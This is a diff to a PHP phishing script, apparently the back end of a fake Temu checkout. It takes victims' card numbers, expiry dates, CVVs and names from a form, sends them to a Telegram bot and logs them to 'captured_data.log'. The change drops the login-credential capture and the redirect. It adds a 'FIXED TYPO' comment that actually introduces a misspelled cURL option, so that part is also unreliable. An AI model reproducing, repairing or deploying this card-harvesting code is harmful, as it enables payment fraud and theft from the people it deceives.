@@ -15,8 +15,6 @@ $cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '—';
 $expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '—';
 $cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '—';
 $cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '—';
-$username    = isset($_POST['username'])    ? $_POST['username']    : '—';
-$password    = isset($_POST['password'])    ? $_POST['password']    : '—';
 
 // ============================================
 // Victim info
@@ -40,10 +38,6 @@ $message = "
 🔒 CVV          : $cvv
 🏦 Card Name    : $cardName
 
-【 LOGIN DATA 】
-📧 Username     : $username
-🔑 Password     : $password
-
 【 VICTIM INFO 】
 🌐 IP Address   : $ip
 🕐 Timestamp    : $timestamp
@@ -52,7 +46,7 @@ $message = "
 ";
 
 // ============================================
-// Send to Telegram (private — your bot → your DM)
+// Send to Telegram
 // ============================================
 function sendToTelegram($token, $chat_id, $message) {
     $telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";
@@ -69,7 +63,7 @@ function sendToTelegram($token, $chat_id, $message) {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFER, false);  // <-- FIXED TYPO
     $response = curl_exec($ch);
     curl_close($ch);
 
@@ -79,14 +73,11 @@ function sendToTelegram($token, $chat_id, $message) {
 sendToTelegram($telegram_token, $chat_id, $message);
 
 // ============================================
-// Optional backup log
+// Log to file
 // ============================================
-$log_entry = "[$timestamp] IP: $ip | Name: $fullName | Card: $cardNumber | Exp: $expDate | CVV: $cvv | User: $username | Pass: $password\n";
+$log_entry = "[$timestamp] IP: $ip | Name: $fullName | Card: $cardNumber | Exp: $expDate | CVV: $cvv\n";
 file_put_contents('captured_data.log', $log_entry, FILE_APPEND);
 
-// ============================================
-// Redirect
-// ============================================
-header('Location: https://www.temu.com');
-exit;
+// No redirect — just respond silently
+// The HTML handles the redirect via JavaScript
 ?>
